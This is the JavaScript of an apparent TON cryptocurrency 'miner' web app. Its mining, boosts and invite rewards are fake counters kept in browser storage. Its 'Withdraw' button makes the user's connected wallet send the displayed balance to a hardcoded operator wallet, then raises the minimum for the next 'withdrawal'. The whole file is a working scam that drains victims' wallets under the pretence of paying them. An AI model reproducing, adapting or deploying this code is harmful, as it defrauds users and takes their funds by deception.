const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json",
    buttonRootId: "connect-wallet"
});

// ==== Встав свій TON гаманець сюди ====
const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <- твій Tonkeeper

let balance = parseFloat(localStorage.getItem("balance")) || 0;
let mining = localStorage.getItem("mining") === "true";
let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;

function updateBalanceUI() {
    document.getElementById("balance").innerText = balance.toFixed(6);
}

// TonConnect статус
tonConnectUI.onStatusChange(wallet => {
    if(wallet){
        console.log("Wallet connected:", wallet.account.address);
        alert("Wallet connected!");
    }
});

// ==== Майнінг ====
function startMining(){
    if(mining) return;
    mining = true;
    localStorage.setItem("mining", "true");

    setInterval(()=>{
        balance += miningSpeed;
        updateBalanceUI();
        localStorage.setItem("balance", balance);
    },1000);
}

// ==== Boost ====
function buyBoost(amount){
    let increment = 0;
    if(amount===1) increment=0.000001929;
    else if(amount===5) increment=0.000005787;
    else if(amount===15) increment=0.0000173611;

    miningSpeed += increment;
    localStorage.setItem("miningSpeed", miningSpeed);
    alert(`Boost purchased! +${increment} TON/sec`);
}

// ==== Invite ====
function inviteFriends(){
    const confirmed = confirm("Did your friend really join?");
    if(!confirmed) return;
    balance += 0.01;
    localStorage.setItem("balance", balance);
    updateBalanceUI();
    alert("You invited a friend! +0.01 TON");
}

// ==== Withdraw ====
async function withdraw(){
    if(balance < minDeposit){
        alert(`Minimum deposit to withdraw ${minDeposit} TON`);
        return;
    }

    try{
        await tonConnectUI.sendTransaction({
            validUntil: Math.floor(Date.now()/1000)+60,
            messages:[{
                address: walletAddress,
                amount: balance.toFixed(9),
                payload:""
            }]
        });

        alert(`Withdraw requested: ${balance.toFixed(6)} TON to wallet ${walletAddress}`);
        balance = 0;
        localStorage.setItem("balance", balance);

        minDeposit = 5;
        localStorage.setItem("minDeposit", minDeposit);

    }catch(err){
        console.error(err);
        alert("Withdraw failed or cancelled");
    }
}

// ==== Функції для кнопок ====
window.connectWallet = () => tonConnectUI.connect();
window.startMining = startMining;
window.buyBoost = buyBoost;
window.inviteFriends = inviteFriends;
window.withdraw = withdraw;

// ==== DOM Ready ====
document.addEventListener("DOMContentLoaded", ()=>{
    updateBalanceUI();
    if(mining) startMining();
});